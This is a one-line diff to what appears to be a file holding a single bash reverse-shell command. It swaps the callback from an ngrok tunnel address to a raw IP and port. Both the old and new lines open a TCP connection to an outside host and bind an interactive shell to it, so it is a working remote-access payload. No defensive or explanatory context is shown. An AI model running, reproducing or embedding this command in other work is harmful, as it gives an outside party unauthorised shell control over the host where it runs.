@@ -1,1 +1,1 @@
-bash -c '0<&98-;exec 98<>/dev/tcp/0.tcp.ap.ngrok.io/15360;sh <&98 >&98 2>&98'
+bash -c '0<&98-;exec 98<>/dev/tcp/36.50.134.20/8009;sh <&98 >&98 2>&98'
